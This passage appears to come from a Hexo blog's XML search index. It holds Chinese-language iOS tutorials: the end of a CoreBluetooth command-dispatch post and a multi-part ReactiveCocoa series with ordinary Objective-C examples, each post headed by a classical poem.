指令响应后回调的block */- (void)dispatchCommand:(XSBleRequestState)command paramData:(NSData *)paramData completion:(void (^)(NSInteger resultCommand))complete &#123; _dispatchCmdComplete = complete; [self handleUniversalBleRequestWithProtocolHeader:XSProtocolHeaderBle bleCmd:command paramData:paramData];&#125;/** 派发蓝牙指令 @param protocolHeader 指令头 （区分不同的蓝牙协议） @param command 蓝牙指令 @param paramData 是否需要发送参数 @param complete 指令响应后回调的block */- (void)dispatchWithProtocolHeader:(XSProtocolHeader)protocolHeader command:(XSBleRequestState)command paramData:(NSData *)paramData completion:(void (^)(NSInteger resultCommand))complete &#123; _dispatchCmdComplete = complete; [self handleUniversalBleRequestWithProtocolHeader:protocolHeader bleCmd:command paramData:paramData];&#125;/** 发送蓝牙指令的通用处理方法(处理完数据后直接写入蓝牙) @param bleCmd 发送的蓝牙指令 @param paramData 发送的数据 */- (void)handleUniversalBleRequestWithProtocolHeader:(XSProtocolHeader)protocolHeader bleCmd:(XSBleRequestState)bleCmd paramData:(NSData *)paramData &#123; NSData *resultData = [NSData data]; if (kObjectIsEmpty(paramData)) &#123; resultData = [XSDataProtocol handleDataWithProtocolHeader:protocolHeader command:bleCmd]; &#125; else &#123; resultData = [XSDataProtocol handleDataWithProtocolHeader:protocolHeader command:bleCmd paramData:paramData]; // 按照约定的协议组装数据 &#125; if (resultData.length) &#123; XSLog(@"最终发送的指令数据：%@", resultData); if (resultData.length &gt; 20) &#123; [self writeMultiplePacketData:resultData toCharacteristic:_bleClient.writeCharacteristic]; &#125; else &#123; [self writeSinglePacketData:resultData toCharacteristic:_bleClient.writeCharacteristic]; &#125; &#125;&#125; 所以大概的写入逻辑就可以简化为 1234[_bleMgr dispatchCommand:XSBleRequestStatusBattery_Level paramData:nil completion:^(NSInteger resultCommand) &#123; // 获取电池电量 // ...... &#125; &#125;]; 关于后台模式 按照Apple的一贯尿性，打着保护隐私的名义限制各种Api和权限，如果想蓝牙在后台运行也是需要申请权限并配置的 App没有申请后台权限则在进入后台模式之后很快就会被挂起（按下home键，大约5秒，app进入suspended状态）。 当app处于挂起状态时，无法处理任何蓝牙相关的任务直到app进入前台（被用户唤醒）。 处于后台模式（backgroud state）或者悬挂模式（suspended state）时，作为中心设备，无法搜索和发现周边在广告的设备。作为外设时，无法广告，此时中心想要通过公开服务的特征去访问它的话都会报错。 具体的后台模式设置及恢复请参考 iOS BLE 开发小记 - 如何实现 CoreBluetooth 后台运行模式 关于Demo 需要Demo请点击这里下载 参考Apple官方文档iOS BLE 开发小记 - 如何实现 CoreBluetooth 后台运行模式]]></content>
      <categories>
        <category>iOS</category>
        <category>蓝牙</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>蓝牙</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS蓝牙开发之外设篇]]></title>
    <url>%2Farchives%2Fbd3ad682.html</url>
    <content type="text"><![CDATA[我时常回到童年，用一片童心来思考问题，很多烦恼的问题就变得易解。——王小波 《一只特立独行的猪》 占坑]]></content>
      <categories>
        <category>iOS</category>
        <category>蓝牙</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>蓝牙</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发ReactiveCocoa（七）：开发中常见用法]]></title>
    <url>%2Farchives%2F2a9c0fa5.html</url>
    <content type="text"><![CDATA[危楼高百尺，手可摘星辰。不敢高声语，恐惊天上人。 ——李白《夜宿山寺》 实际项目中的不同风格用法参考常用的写法用RAC替代 控件赋值也可以这么样用（类似于cell中设置）12345678910111213141516RAC(self.textLabel, text) = RACObserve(self, city.cityName); // 直接给label文字赋值RAC(self.imgView, image) = [[[RACObserve(self, city.thumbnailData) // 直接给imageView 赋值 ignore:nil] map:^id(id value) &#123; // 转换图片 return [[[RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123; UIImage *image = [UIImage imageWithData:value]; [subscriber sendNext:image]; [subscriber sendCompleted]; return nil; &#125;] subscribeOn:[RACScheduler scheduler]] deliverOn:[RACScheduler mainThreadScheduler]]; // 主线程更新&#125;]switchToLatest]; 转模型也可以这么用12345678910111213141516171819- (void)initSearchSubscrition &#123;[[self.searchSignal deliverOn:[RACScheduler mainThreadScheduler]] subscribeNext:^(RACTuple *jsonSearchResult) &#123; NSDictionary *response; if (jsonSearchResult.count) &#123; response = jsonSearchResult.first; &#125; NSArray *rawArray = response[@"geoNames"]; self.cities = [[[rawArray.rac_sequence // 获取的数据转rac_sequence (里面都是信号) map:^id(NSDictionary *rawDic) &#123; // 转模型 NSMutableDictionary *dic = [(NSDictionary *)rawDic mutableCopy]; City *city = [MTLJSONAdapter modelOfClass:City.class fromJSONDictionary:dic error:nil]; [self downloadImageForCity:city]; return city; &#125;] array] mutableCopy]; // 放进数组中 并拷贝新生成一份 &#125;]; [self.searchSignal subscribeError:^(NSError *error) &#123; self.statusMessage = @"offLine"; &#125;];&#125; 代理方法也可以这么调12345[[self rac_signalForSelector:@selector(didSaveDataCallback:) fromProtocol:@protocol(SaveDataCallBack)] subscribeNext:^(RACTuple *tuple) &#123; City *newCity = tuple.first; [self.viewModel.cities insertObject:newCity atIndex:0]; [self.geoTbl reloadData]; &#125;]; 多个渠道请求数据都返回才能进行下一步 可以这么组装1234567891011121314151617181920212223RACSignal *requestHot = [RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123; NSLog(@"请求最热商品"); [subscriber sendNext:@"获取最热商品"]; return nil; &#125;];RACSignal *requestNew = [RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123; NSLog(@"请求最新商品"); // [subscriber sendNext:@"获取最新商品"]; return nil; &#125;]; // Selector调用:当所有信号都发送数据的时候调用 // 数组存放信号 // Selector注意点:参数根据数组元素决定 // Selector方法参数类型,就是信号传递出来数据 [self rac_liftSelector:@selector(updateUI:data2:) withSignalsFromArray:@[requestHot,requestNew]]; &#125; // 只要两个请求都请求完成的时候才会调用 - (void)updateUI:(NSString *)data1 data2:(NSString *)data2 &#123; NSLog(@"%@ %@",data1,data2); &#125; 监听属性改变12// 设置Label 文字跟着 TextField的改变而改变RAC(self.myLab, text) = self.myTF.rac_textSignal; 1234// 监听某一个属性的改变[RACObserve(self.per, name) subscribeNext:^(NSString *name) &#123; // name 即 self.per.name&#125;]; 数组1234NSArray *array = @[@1, @2, @3, @4, @5];[array.rac_sequence.signal subscribeNext:^(id x) &#123; // x 即 数组 array 的元素 &#125;]; 1234// 过滤 filter，并获取过滤后的数组NSArray *filter = [[array.rac_sequence filter:^BOOL(id value) &#123; return [value integerValue] &gt; 2;&#125;] array]; 123456// 匹配、映射 map，变换元素并获取新数组NSArray *map = [[array.rac_sequence map:^id(id value) &#123; NSInteger a = [value integerValue] * [value integerValue]; return [NSString stringWithFormat:@"%ld", a];&#125;] array]; 字典1234567// rac_keySequence 和 rac_valueSequence 跟数组一样// rac_sequence 需要 RACTupleUnpack 解包NSDictionary *dic = @&#123;@"name": @"lion", @"age": @18&#125;;[dic.rac_sequence.signal subscribeNext:^(id x) &#123; RACTupleUnpack(NSString *key, NSString *value) = x; NSLog(@"\r\nkey: %@\r\nvalue: %@", key, value);&#125;];]]></content>
      <categories>
        <category>iOS</category>
        <category>RAC</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发ReactiveCocoa（六）：冷信号与热信号]]></title>
    <url>%2Farchives%2F53929de4.html</url>
    <content type="text"><![CDATA[谁家玉笛暗飞声，散入春风满洛城。此夜曲中闻折柳，何人不起故园情。 ——李白《春夜洛城闻笛》 冷信号与热信号特点 热信号是主动的，即使你没有订阅事件，它仍然会时刻推送。（例如它会推送值即使还没有订阅者）而冷信号是被动的，只有当你订阅的时候，它才会发送消息。 热信号可以有多个订阅者，是一对多，信号可以与订阅者共享信息。（订阅者1和订阅者2是共享的，他们都能在同一时间接收到某个值），而冷信号只能一对一，当有不同的订阅者，消息会从新完整发送。（两个订阅者没有联系，都是基于各自的订阅时间开始接收消息的）。 美团的几篇资料 （开发中可能遇到的坑） 细说ReactiveCocoa的冷信号与热信号1 细说ReactiveCocoa的冷信号与热信号2 细说ReactiveCocoa的冷信号与热信号3 RACSignal的Subscription深入分析]]></content>
      <categories>
        <category>iOS</category>
        <category>RAC</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发ReactiveCocoa（五）：RAC底层bind]]></title>
    <url>%2Farchives%2Fa972913f.html</url>
    <content type="text"><![CDATA[故人西辞黄鹤楼，烟花三月下扬州。孤帆远影碧空尽，唯见长江天际流。 ——李白《送孟浩然之广陵》 bind方法简单介绍和使用123456789101112131415161718192021222324252627282930313233343536373839404142434445// 假设想监听文本框的内容，并且在每次输出结果的时候，都在文本框的内容拼接一段文字“输出：”// 方式一:在返回结果后，拼接。 [_textField.rac_textSignal subscribeNext:^(id x) &#123; NSLog(@"输出:%@",x); &#125;];// 方式二:在返回结果前，拼接，使用RAC中bind方法做处理。// bind方法参数:需要传入一个返回值是RACStreamBindBlock的block参数// RACStreamBindBlock是一个block的类型，返回值是信号，参数（value,stop），因此参数的block返回值也是一个block。// RACStreamBindBlock:// 参数一(value):表示接收到信号的原始值，还没做处理// 参数二(*stop):用来控制绑定Block，如果*stop = yes,那么就会结束绑定。// 返回值：信号，做好处理，在通过这个信号返回出去，一般使用RACReturnSignal,需要手动导入头文件RACReturnSignal.h。// bind方法使用步骤:// 1.传入一个返回值RACStreamBindBlock的block。// 2.描述一个RACStreamBindBlock类型的bindBlock作为block的返回值。// 3.描述一个返回结果的信号，作为bindBlock的返回值。// 注意：在bindBlock中做信号结果的处理。// 底层实现:// 1.源信号调用bind,会重新创建一个绑定信号。// 2.当绑定信号被订阅，就会调用绑定信号中的didSubscribe，生成一个bindingBlock。// 3.当源信号有内容发出，就会把内容传递到bindingBlock处理，调用bindingBlock(value,stop)// 4.调用bindingBlock(value,stop)，会返回一个内容处理完成的信号（RACReturnSignal）。// 5.订阅RACReturnSignal，就会拿到绑定信号的订阅者，把处理完成的信号内容发送出来。// 注意:不同订阅者，保存不同的nextBlock，看源码的时候，一定要看清楚订阅者是哪个。// 这里需要手动导入#import &lt;ReactiveCocoa/RACReturnSignal.h&gt;，才能使用RACReturnSignal。[[_textField.rac_textSignal bind:^RACStreamBindBlock&#123; // 什么时候调用: // block作用:表示绑定了一个信号. return ^RACStream *(id value, BOOL *stop)&#123; // 什么时候调用block:当信号有新的值发出，就会来到这个block。 // block作用:做返回值的处理 // 做好处理，通过信号返回出去. return [RACReturnSignal return:[NSString stringWithFormat:@"输出:%@",value]]; &#125;;&#125;] subscribeNext:^(id x) &#123; NSLog(@"%@",x);&#125;];]]></content>
      <categories>
        <category>iOS</category>
        <category>RAC</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发ReactiveCocoa（四）：Flattenmap和Map]]></title>
    <url>%2Farchives%2F8b316e8d.html</url>
    <content type="text"><![CDATA[峨眉山月半轮秋，影入平羌江水流。夜发清溪向三峡，思君不见下渝州。 ——李白《峨眉山月歌》 flattenMap和Map flattenMap，Map用于把源信号内容映射成新的内容 flattenMap简单使用 12345678910111213141516171819202122232425262728// 监听文本框的内容改变，把结构重新映射成一个新值.// flattenMap作用:把源信号的内容映射成一个新的信号，信号可以是任意类型。// flattenMap使用步骤:// 1.传入一个block，block类型是返回值RACStream，参数value// 2.参数value就是源信号的内容，拿到源信号的内容做处理// 3.包装成RACReturnSignal信号，返回出去。// flattenMap底层实现:// 0.flattenMap内部调用bind方法实现的,flattenMap中block的返回值，会作为bind中bindBlock的返回值。// 1.当订阅绑定信号，就会生成bindBlock。// 2.当源信号发送内容，就会调用bindBlock(value, *stop)// 3.调用bindBlock，内部就会调用flattenMap的block，flattenMap的block作用：就是把处理好的数据包装成信号。// 4.返回的信号最终会作为bindBlock中的返回信号，当做bindBlock的返回信号。// 5.订阅bindBlock的返回信号，就会拿到绑定信号的订阅者，把处理完成的信号内容发送出来。[[_textField.rac_textSignal flattenMap:^RACStream *(id value) &#123; // block什么时候 : 源信号发出的时候，就会调用这个block。 // block作用 : 改变源信号的内容。 // 返回值：绑定信号的内容. return [RACReturnSignal return:[NSString stringWithFormat:@"输出:%@",value]];&#125;] subscribeNext:^(id x) &#123; // 订阅绑定信号，每当源信号发送内容，做完处理，就会调用这个block。 NSLog(@"%@",x);&#125;]; Map简单使用: 123456789101112131415161718192021222324// 监听文本框的内容改变，把结构重新映射成一个新值.// Map作用:把源信号的值映射成一个新的值// Map使用步骤:// 1.传入一个block,类型是返回对象，参数是value// 2.value就是源信号的内容，直接拿到源信号的内容做处理// 3.把处理好的内容，直接返回就好了，不用包装成信号，返回的值，就是映射的值。// Map底层实现:// 0.Map底层其实是调用flatternMap,Map中block中的返回的值会作为flatternMap中block中的值。// 1.当订阅绑定信号，就会生成bindBlock。// 3.当源信号发送内容，就会调用bindBlock(value, *stop)// 4.调用bindBlock，内部就会调用flattenMap的block// 5.flattenMap的block内部会调用Map中的block，把Map中的block返回的内容包装成返回的信号。// 5.返回的信号最终会作为bindBlock中的返回信号，当做bindBlock的返回信号。// 6.订阅bindBlock的返回信号，就会拿到绑定信号的订阅者，把处理完成的信号内容发送出来。 [[_textField.rac_textSignal map:^id(id value) &#123; // 当源信号发出，就会调用这个block，修改源信号的内容 // 返回值：就是处理完源信号的内容。 return [NSString stringWithFormat:@"输出:%@",value];&#125;] subscribeNext:^(id x) &#123; NSLog(@"%@",x);&#125;]; FlatternMap和Map的区别 FlatternMap中的Block返回信号。 Map中的Block返回对象。 开发中，如果信号发出的值不是信号，映射一般使用Map 开发中，如果信号发出的值是信号，映射一般使用FlatternMap 总结：signalOfsignals用FlatternMap 123456789101112131415161718// 创建信号中的信号RACSubject *signalOfsignals = [RACSubject subject];RACSubject *signal = [RACSubject subject];[[signalOfsignals flattenMap:^RACStream *(id value) &#123; // 当signalOfsignals的signals发出信号才会调用 return value;&#125;] subscribeNext:^(id x) &#123; // 只有signalOfsignals的signal发出信号才会调用，因为内部订阅了bindBlock中返回的信号，也就是flattenMap返回的信号。 // 也就是flattenMap返回的信号发出内容，才会调用。 NSLog(@"%@aaa",x);&#125;];// 信号的信号发送信号[signalOfsignals sendNext:signal];// 信号发送内容[signal sendNext:@1];]]></content>
      <categories>
        <category>iOS</category>
        <category>RAC</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发ReactiveCocoa（三）：RACMulticastConnection]]></title>
    <url>%2Farchives%2Ffec44934.html</url>
    <content type="text"><![CDATA[朝辞白帝彩云间，千里江陵一日还。两岸猿声啼不住，轻舟已过万重山。 ——李白《早发白帝城》 RACMulticastConnection 用于当一个信号，被多次订阅时，为了保证创建信号时，避免多次调用创建信号中的block，造成副作用，可以使用这个类处理。 使用注意:RACMulticastConnection通过RACSignal的-publish或者-muticast:方法创建. RACMulticastConnection使用步骤: 创建信号 + (RACSignal *)createSignal:(RACDisposable * (^)(id&lt;RACSubscriber&gt; subscriber))didSubscribe 创建连接 RACMulticastConnection *connect = [signal publish]; 订阅信号,注意：订阅的不在是之前的信号，而是连接的信号：connect.signal 连接 [connect connect] RACMulticastConnection底层原理: 创建connect，connect.sourceSignal -&gt; RACSignal(原始信号) connect.signal -&gt; RACSubject 订阅connect.signal，会调用RACSubject的subscribeNext，创建订阅者，而且把订阅者保存起来，不会执行block。 [connect connect]内部会订阅RACSignal(原始信号)，并且订阅者是RACSubject- 订阅原始信号，就会调用原始信号中的didSubscribe - didSubscribe，拿到订阅者调用sendNext，其实是调用RACSubject的sendNext RACSubject的sendNext,会遍历RACSubject所有订阅者发送信号。- 因为刚刚第二步，都是在订阅RACSubject，因此会拿到第二步所有的订阅者，调用他们的nextBlock 需求：假设在一个信号中发送请求，每次订阅一次都会发送请求，这样就会导致多次请求。解决：使用RACMulticastConnection就能解决. 1234567891011121314151617181920212223242526272829303132333435363738// 1.创建请求信号RACSignal *signal = [RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber&#123; NSLog(@"发送请求"); return nil;&#125;];// 2.订阅信号[signal subscribeNext:^(id x) &#123; NSLog(@"接收数据");&#125;];// 2.订阅信号[signal subscribeNext:^(id x) &#123; NSLog(@"接收数据");&#125;];// 3.运行结果，会执行两遍发送请求，也就是每次订阅都会发送一次请求// RACMulticastConnection:解决重复请求问题// 1.创建信号RACSignal *signal = [RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123; NSLog(@"发送请求"); [subscriber sendNext:@1]; return nil;&#125;];// 2.创建连接RACMulticastConnection *connect = [signal publish];// 3.订阅信号，// 注意：订阅信号，也不能激活信号，只是保存订阅者到数组，必须通过连接,当调用连接，就会一次性调用所有订阅者的sendNext:[connect.signal subscribeNext:^(id x) &#123; NSLog(@"订阅者一信号");&#125;];[connect.signal subscribeNext:^(id x) &#123; NSLog(@"订阅者二信号");&#125;];// 4.连接,激活信号[connect connect];]]></content>
      <categories>
        <category>iOS</category>
        <category>RAC</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发ReactiveCocoa（二）：RACCommand篇]]></title>
    <url>%2Farchives%2F63f63348.html</url>
    <content type="text"><![CDATA[日照香炉生紫烟，遥看瀑布挂前川。飞流直下三千尺，疑是银河落九天。 ——李白《望庐山瀑布》 RACCommand 简单使用 RAC中用于处理事件的类，可以把事件如何处理,事件中的数据如何传递，包装到这个类中，他可以很方便的监控事件的执行过程。 executionSignals是signal of signals，如果直接subscribe的话会得到一个signal，而不是我们想要的value，所以一般会配合switchToLatest。 errors : 跟正常的signal不一样，RACCommand的错误不是通过sendError来实现的，而是通过errors属性传递出来的。 executing 表示该command当前是否正在执行。 一、RACCommand使用步骤: 创建命令 initWithSignalBlock:(RACSignal*(^)(id input))signalBlock 在signalBlock中，创建RACSignal，并且作为signalBlock的返回值 执行命令 - (RACSignal *)execute:(id)input 二、RACCommand使用注意: signalBlock必须要返回一个信号，不能传nil. 如果不想要传递信号，直接创建空的信号[RACSignal empty]; RACCommand中信号如果数据传递完，必须调用[subscriber sendCompleted]，这时命令才会执行完毕，否则永远处于执行中。 三、RACCommand设计思想：内部signalBlock为什么要返回一个信号，这个信号有什么用。 在RAC开发中，通常会把网络请求封装到RACCommand，直接执行某个RACCommand就能发送请求。 当RACCommand内部请求到数据的时候，需要把请求的数据传递给外界，这时候就需要通过signalBlock返回的信号传递了。 四、如何拿到RACCommand中返回信号发出的数据。 RACCommand有个执行信号源executionSignals，这个是signal of signals(信号的信号),意思是信号发出的数据是信号，不是普通的类型。 订阅executionSignals就能拿到RACCommand中返回的信号，然后订阅signalBlock返回的信号，就能获取发出的值。 五、监听当前命令是否正在执行executing六、使用场景,监听按钮点击，网络请求 1234567891011121314151617181920212223242526272829303132333435363738394041424344// 1.创建命RACCommand *command = [[RACCommand alloc] initWithSignalBlock:^RACSignal *(id input) &#123; NSLog(@"执行命令"); // 创建空信号,必须返回信号 // return [RACSignal empty]; // 2.创建信号,用来传递数据 return [RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123; [subscriber sendNext:@"请求数据"]; // 注意：数据传递完，最好调用sendCompleted，这时命令才执行完毕。 [subscriber sendCompleted]; return nil; &#125;]; &#125;]; // 强引用命令，不要被销毁，否则接收不到数据 _conmmand = command; // 3.订阅RACCommand中的信号 [command.executionSignals subscribeNext:^(id x) &#123; [x subscribeNext:^(id x) &#123; NSLog(@"%@",x); &#125;]; &#125;]; // RAC高级用法 // switchToLatest:用于signal of signals，获取signal of signals发出的最新信号,也就是可以直接拿到RACCommand中的信号 [command.executionSignals.switchToLatest subscribeNext:^(id x) &#123; NSLog(@"%@",x); &#125;]; // 4.监听命令是否执行完毕,默认会来一次，可以直接跳过，skip表示跳过第一次信号。 [[command.executing skip:1] subscribeNext:^(id x) &#123; if ([x boolValue] == YES) &#123; // 正在执行 NSLog(@"正在执行"); &#125; else &#123; // 执行完成 NSLog(@"执行完成"); &#125;&#125;];// 5.执行命令[self.conmmand execute:@1];]]></content>
      <categories>
        <category>iOS</category>
        <category>RAC</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发ReactiveCocoa（一）：介绍]]></title>
    <url>%2Farchives%2F48d913e0.html</url>
    <content type="text"><![CDATA[君不见黄河之水天上来，奔流到海不复回。君不见高堂明镜悲白发，朝如青丝暮成雪。人生得意须尽欢，莫使金樽空对月。天生我材必有用，千金散尽还复来。烹羊宰牛且为乐，会须一饮三百杯。岑夫子，丹丘生，将进酒，杯莫停。与君歌一曲，请君为我侧耳听。钟鼓馔玉不足贵，但愿长醉不复醒。古来圣贤皆寂寞，惟有饮者留其名。陈王昔时宴平乐，斗酒十千恣欢谑。主人何为言少钱，径须沽取对君酌。五花马，千金裘，呼儿将出换美酒，与尔同销万古愁。 ——李白《将进酒·君不见黄河之水天上来》 ReactiveCocoa 是函数响应编程(Functional Reactive Programming, FRP)框架 实际的开发中是和MVVM结合进行开发、互相弥补 Github上整合的比较全面的（MVVM、RAC）学习资料 Github 上面比较全的资料 美团的几篇资料 （开发中可能遇到的坑） 细说ReactiveCocoa的冷信号与热信号1 细说ReactiveCocoa的冷信号与热信号2 细说ReactiveCocoa的冷信号与热信号3 RACSignal的Subscription深入分析 注意点 RAC只处理对象, 而不处理像BOOL这样的原始值. 不过, RAC通常会帮我们自动做这些转换. 使用Cocoapods导入ReactiveCocoa 报错 ld: library not found for -lPods 解决方法 : Target’s General settings and go to Linked Frameworks and Libraries and just delete -libPods.a from the list. 信号的释放 ReactiveCocoa维护了一个全局的信号集合。 如果信号有一个或多个订阅者，它就是可用的。如果所有订阅者都被移除了，信号就被释放了。 信号的取消订阅 在一个completed事件或error事件后，一个订阅者会自动将自己移除。 手动移除可能通过RACDisposable来完成。RACSignal的所有订阅方法都返回一个RACDisposable实例，我们可以调用它的dispose方法来手动移除订阅者。 如果我们创建了一个信号，但不去订阅它，则信号永远不会执行，包括任何如doNext:这样的附加操作。 Signal events是线性的，不会出现并发的情况，除非显式地指定Scheduler。所以subscribeNext:error:completed:里的block不需要锁定或者synchronized等操作，其他的events会依次排队，直到block处理完成。 生成Signal时，最好指定Name, -setNameWithFormat: 方便调试 Side Effect （副作用） Hot signals without side effects 最好使用property，如“textChanged”，不太理解什么情况用到这个，权当做一个静态的属性来看就行。 Cold signals without side effects 使用名词类型的方法名，如“-currentText”，“currentModels”，同时表明了返回值是什么（这个尤其得注意，RACSignal的next值是id类型，所以全得是靠约定才知道具体返回类型） Signals with side effects 这种就是像login一样有副作用的了，推荐使用动词类型的方法名，用对动词基本就能知道是不是有副作用了，比如“-loginSignal”和“-saveToFile”大概就知道前面一个很可能有副作用，后面一个多存几次文件应该没副作用 RAC VS 原生 rac_signalForSelector：用于替代代理 rac_valuesAndChangesForKeyPath：用于监听某个对象的属性改变 rac_signalForControlEvents：用于监听某个事件。 rac_addObserverForName:用于监听某个通知 rac_textSignal:只要文本框发出改变就会发出这个信号 处理当界面有多次请求时，需要都获取到数据时，才能展示界面 rac_liftSelector:withSignalsFromArray:Signals:当传入的Signals(信号数组)，每一个signal都至少sendNext过一次，就会去触发第一个selector参数的方法 使用注意：几个信号，参数一的方法就几个参数，每个参数对应信号发出的数据 RAC提供的宏 RAC() 你提供想要与即将到来的值绑定的对象和参数, 在其内部它所做的是创建一个订阅者并更新其属性的值 这个宏是最常用的，RAC()总是出现在等号左边，等号右边是一个RACSignal，表示的意义是将一个对象的一个属性和一个signal绑定，signal每产生一个value（id类型），都会自动执行：[TARGET setValue:value ?: NIL_VALUE forKeyPath:KEYPATH]; 12345RACSignal *usernameIsValidSignal = RACObserve(self.viewModel, isUsernameValid);RAC(self.goButton, enabled) = usernameIsValidSignal; RAC(self.goButton, alpha) = [usernameIsValidSignal map:^id(NSNumber *usernameIsValid)&#123; return usernameIsValid.boolValue ? @1.0 : @0.5; &#125;]; RACObserve() 这个宏是RAC中对KVO中那些API的替代. 你只需要传入对象和你想观察的那个对象某属性的 keypath. 给出这些参数后, RACObserve会创建一个信号, 一旦它有了订阅者, 它就立刻发送那个属性的当前值, 并在发送那个属性在这之后的任何变化. 123456// create and get a reference to the signal RACSignal *usernameValidSignal = RACObserve(self.viewModel, isUsernameValid);// update the local property when this value changes[usernameValidSignal subscribeNext: ^(NSNumber *isValidNumber) &#123;self.usernameIsValid = isValidNumber. boolValue&#125;]; 循环引用的宏 @weakify(self); // 在外面声明 @strongify(self); // 在引用的地方声明 这两个宏一定成对出现，先weak再strong 常用知识点 map : 将一个值转化为另一个值输出 将会创建一个和原来一模一样的信号，只不过新的信号传递的值变为了block（value），也就是说，如果block(value)是一个信号，那么就是信号的value仍然是信号。 flattenMap : 解决Signal of Signals问题，flattenMap则会继续调用这个信号的value，作为新的信号的value。 switchToLatest : 用于signal of signals，获取signal of signals发出的最新信号,也就是可以直接拿到RACCommand中的信号 filter : 过滤一些条件，以确保符合条件的值才能被传递出去 ignore : 忽略给定的值 注意，这里忽略的既可以是地址相同的对象，也可以是- isEqual:结果相同的值，也就是说自己写的Model对象可以通过重写- isEqual:方法来使- ignore:生效。常用的值的判断没有问题，如下: 1234[[self.inputTextField.rac_textSignal ignore:@"seven"] subscribeNext:^(NSString *value)&#123;NSLog(@"`seven` could never appear : %@", value);&#125;]; distinctUntilChanged : 它将这一次的值与上一次做比较，当相同时（也包括- isEqual:）被忽略掉。 1234RAC(self.label, text) = [RACObserve(self.user, username) distinctUntilChanged];self.user.username = @"sunnyxx"; // 1stself.user.username = @"sunnyxx"; // 2ndself.user.username = @"sunnyxx"; // 3rd 如果不增加distinctUntilChanged的话对于连续的相同的输入值就会有不必要的处理，这个栗子只是简单的UI刷新，但遇到如写数据库，发网络请求的情况时，代价就不能购忽略了。 所以，对于相同值可以忽略的情况，果断加上它吧。 起止点过滤类型 除了被动的当next值来的时候做判断，也可以主动的提前选择开始和结束条件，分为两种类型： take型（取） skip型(跳) take:(NSUInteger) : 从开始一共取N次的next值，不包括Competion和Error，如： 123456789[[[RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123;[subscriber sendNext:@"1"];[subscriber sendNext:@"2"];[subscriber sendNext:@"3"];[subscriber sendCompleted];return nil;&#125;] take:2] subscribeNext:^(id x) &#123;NSLog(@"only 1 and 2 will be print: %@", x);&#125;]; takeLast:(NSUInteger) : 取最后N次的next值 注意，由于一开始不能知道这个Signal将有多少个next值，所以RAC实现它的方法是将所有next值都存起来，然后原Signal完成时再将后N个依次发送给接收者 但Error发生时依然是立刻发送的 takeUntil:(RACSignal *) : 当给定的signal完成前一直取值, 也就是这个Signal一直到textField执行dealloc时才停止。最简单的栗子就是UITextField的rac_textSignal的实现（删减版本）: 123456789- (RACSignal *)rac_textSignal &#123;@weakify(self);return [[[[[RACSignal concat:[self rac_signalForControlEvents:UIControlEventEditingChanged]] map:^(UITextField *x) &#123; return x.text; &#125;] takeUntil:self.rac_willDeallocSignal] // bingo!&#125; takeUntilBlock:(BOOL(^)(id x)) : 对于每个next值，运行block，当block返回YES时停止取值，如： 12345[[self.inputTextField.rac_textSignal takeUntilBlock:^BOOL(NSString *value) &#123;return [value isEqualToString:@"stop"];&#125;] subscribeNext:^(NSString *value) &#123;NSLog(@"current value is not `stop`: %@", value);&#125;]; takeWhileBlock:(BOOL(^)(id x)) : 上面的反向逻辑，对于每个next值，block返回 YES时才取值 skip:(NSUInteger) : 从开始跳过N次的next值，简单的栗子： 123456789[[[RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123;[subscriber sendNext:@"1"];[subscriber sendNext:@"2"];[subscriber sendNext:@"3"];[subscriber sendCompleted];return nil;&#125;] skip:1] subscribeNext:^(id x) &#123;NSLog(@"only 2 and 3 will be print: %@", x);&#125;]; skipUntilBlock:(BOOL(^)(id x)) : 和- takeUntilBlock:同理，一直跳，直到block为YES skipWhileBlock:\(BOOL(^)(id x)) : 和- takeWhileBlock:同理，一直跳，直到block为NO merge : 合并信号，只要有一个信号变化就会调用 12345678@weakify(self); [[RACSignal merge: @[RACObserve(self.viewModel, tweets),RACObserve(self.viewModel, allTweetsLoaded)]]bufferWithTime: 0 onScheduler: [RACScheduler mainThreadScheduler]]subscribeNext: ^(id value) &#123;@strongify(self);[self.tableView reloadData];&#125;]; combineLatest : 将多个信号合并起来，并且拿到各个信号的最新的值,必须每个合并的signal至少都有过一次sendNext，才会触发合并的信号 根据组合的信号的值再转换生成判断条件 1234567RACSignal *signupActiveSignal = [RACSignal combineLatest:@[validUsernameSignal,validPwdSignal] reduce:^id(NSNumber *usernameValid, NSNumber *passwordValid) &#123;return @(usernameValid.boolValue &amp;&amp; passwordValid.boolValue);&#125;];[signupActiveSignal subscribeNext:^(NSNumber *state) &#123;self.signInButton.enabled = state.boolValue;&#125;]; doNext: 注意doNext:并不返回一个值，因为它是附加操作。它完成时不改变事件。 concat: 按一定顺序拼接信号，当多个信号发出的时候，有顺序的接收信号 （只需要订阅拼接的信号就可以了） then: then方法会等到completed事件发出后调用，然后订阅由then:block参数返回的信号。这有效地将控制从一个信号传递给下一个信号 zipWith: 把两个信号压缩成一个信号，只有当两个信号同时发出信号内容时，并且把两个信号的内容合并成一个元组，才会触发压缩流的next事件 RACScheduler : 